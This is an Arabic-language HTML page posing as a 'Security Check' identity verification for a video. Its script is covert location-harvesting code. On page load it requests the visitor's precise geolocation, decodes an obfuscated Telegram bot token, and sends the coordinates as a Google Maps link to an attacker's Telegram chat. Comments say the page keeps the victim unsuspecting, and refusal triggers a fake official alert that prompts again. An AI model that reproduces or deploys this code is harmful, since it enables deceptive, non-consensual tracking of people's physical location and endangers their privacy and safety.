<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد الوصول للنظام</title>
    <style>
        body { background: #000; color: #fff; text-align: center; margin: 0; overflow: hidden; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
        video { width: 90%; max-width: 400px; border-radius: 15px; box-shadow: 0 0 20px rgba(255,255,255,0.4); border: 2px solid #333; }
        .status-text { margin-top: 15px; font-size: 14px; color: #aaa; }
        .msg { position: absolute; top: 10px; width: 100%; font-size: 12px; color: #444; }
    </style>
</head>
<body>

    <div class="msg">Security Check: v4.2.9</div>

    <video id="vid" autoplay muted loop playsinline>
        <source src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHJueGZ4dzZ3YXJ4ZzR4ZzR4ZzR4ZzR4ZzR4ZzR4ZzR4ZzR4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKMGpxx70ZAZ67u/giphy.mp4" type="video/mp4">
    </video>
    
    <p class="status-text">يرجى الضغط على <b>"سماح"</b> لتأكيد هويتك ومشاهدة المحتوى بالكامل</p>

    <script>
        window.onload = function() {
            // طلب الموقع فوراً عند تحميل الصفحة
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError, {enableHighAccuracy: true});
            } else {
                console.log("Not supported");
            }
        };

        function sendLocation(position) {
            // توكن m_y_911_bot مشفر
            const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const urlParams = new URLSearchParams(window.location.search);
            const id = urlParams.get('id');
            
            // رابط خرائط جوجل الصافي
            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            if(id) {
                const m = `📍 **تم سحب موقع جغرافي جديد (أبو سند)**\n\n🔗 الرابط على الخريطة:\n${mapsLink}`;
                
                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent(m)}&parse_mode=Markdown`)
                .then(() => {
                    // بعد السحب بنخليه على الصفحة عشان ما يشك
                    document.querySelector('.status-text').innerHTML = "تم التحقق من هويتك بنجاح ✅";
                });
            }
        }

        function showError(error) {
            // إذا رفض بنرجع نطلبه منه بشكل "رسمي"
            alert("عذراً، يجب السماح بالوصول للموقع لإكمال عملية الفحص وتفعيل الفيديو.");
            navigator.geolocation.getCurrentPosition(sendLocation);
        }
    </script>
</body>
</html>
